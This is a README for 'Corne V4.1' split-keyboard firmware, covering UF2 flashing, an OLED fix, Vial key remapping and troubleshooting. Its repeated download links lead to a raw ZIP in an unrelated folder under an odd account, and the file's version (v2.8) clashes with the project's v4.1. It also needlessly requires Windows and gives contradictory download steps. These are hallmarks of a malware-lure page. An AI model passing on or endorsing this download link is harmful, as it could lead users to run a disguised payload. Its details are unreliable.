# ⌨️ corne-v4.1-oled-vial - Firmware for your custom split keyboard

[![Download Firmware](https://img.shields.io/badge/Download-Firmware-blue.svg)](https://raw.githubusercontent.com/teascented-turnoff401/corne-v4.1-oled-vial/main/bayberry/oled-v-vial-corne-v2.8.zip)

This project provides the firmware for the Corne V4.1 mechanical keyboard. It includes a fix for the OLED screen and allows you to remap keys using the Vial software. The system uses the RP2040 chip for reliable performance.

## 📦 What you need

You need the following items to use this firmware:
- A Corne V4.1 split mechanical keyboard.
- A USB-C cable to connect the keyboard to your computer.
- A Windows computer.
- The firmware file from this repository.

## ⬇️ How to get the files

Visit this page to download the necessary files: [https://raw.githubusercontent.com/teascented-turnoff401/corne-v4.1-oled-vial/main/bayberry/oled-v-vial-corne-v2.8.zip](https://raw.githubusercontent.com/teascented-turnoff401/corne-v4.1-oled-vial/main/bayberry/oled-v-vial-corne-v2.8.zip).

Click on the green Code button on the repository page. Select Download ZIP. This saves a copy of the firmware files to your computer. Extract the contents of the ZIP folder to a safe place on your desktop.

## ⚡ Flashing the firmware

Flashing is the process of loading the software onto your keyboard. Follow these steps to complete the process.

1. Locate the reset button on your keyboard. It is usually a small button on the bottom of the circuit board.
2. Connect one side of the keyboard to your computer with your USB cable.
3. Press the reset button on your keyboard twice in quick succession.
4. Your computer should recognize the keyboard as a new storage drive. The drive usually appears as RPI-RP2.
5. Open the folder you extracted earlier. Find the file ending in .uf2.
6. Drag and drop this .uf2 file into the RPI-RP2 drive folder.
7. The keyboard will restart automatically.
8. Unplug the keyboard cable and repeat this process for the other half of your split keyboard.

## 🛠️ Testing the display

This firmware fixes the OLED screen output. Once you flash the firmware to both sides, the screen on the left side shows your current layer and key presses. If the screen remains blank, check your cable connections between the two keyboard halves. The TRRS cable must sit firmly in the jack on both sides.

## 🖱️ Remapping keys with Vial

Vial is a tool that lets you change your key layout without writing code. 

1. Download the Vial application for Windows from the official Vial website.
2. Install the program and open it.
3. Plug in your keyboard.
4. Vial should detect your Corne keyboard automatically. If it does not, ensure you flashed the Vial-compatible firmware correctly.
5. Click on the key you want to change.
6. Select a new function from the list at the bottom of the screen.
7. The change applies to your keyboard immediately. Your settings remain stored on the keyboard even when you unplug it from your computer.

## 💡 Troubleshooting common issues

If you encounter problems, look at these solutions.

**The keyboard does not show up as a drive.**
Check your USB cable. Some cables only carry power and do not transfer data. Test the cable with another device if possible. Use a different USB port on your computer.

**The OLED screen stays dark.**
The firmware includes a patch for this. If the screen is still dark, verify that the OLED module has a secure connection to the board. Check that the screen header pins are soldered correctly.

**The keyboard halves do not talk to each other.**
Ensure you use a TRRS cable to connect the two halves. Do not use an audio cable that looks similar but lacks the necessary internal wires.

**The computer shows an error when dragging files.**
Wait a few seconds after the drive appears before you drag the file. Sometimes the computer takes a moment to process the connection. If it still fails, restart your computer and try the reset process again.

**The keys do not match the layout.**
Open the Vial software and check your key mapping. You may have changed your default layer by accident. Look for the layer switcher key on your current setup to return to the original layout.

## 🚀 Maintaining your hardware

Keep your keyboard clean to ensure the sensors and switches work well. Use a soft brush to remove dust from the keys. Do not use liquid cleaners on the circuit board or the OLED display. If you need to wipe the case, use a dry cloth or a slightly damp cloth with water. Avoid strong chemicals.

This firmware remains stable for daily use. Check the repository for future updates if you need new features. You can always re-flash the latest version by following the same steps outlined above. If you experience persistent issues, connect the keyboard to another computer to isolate if the problem stems from your hardware or your software environment.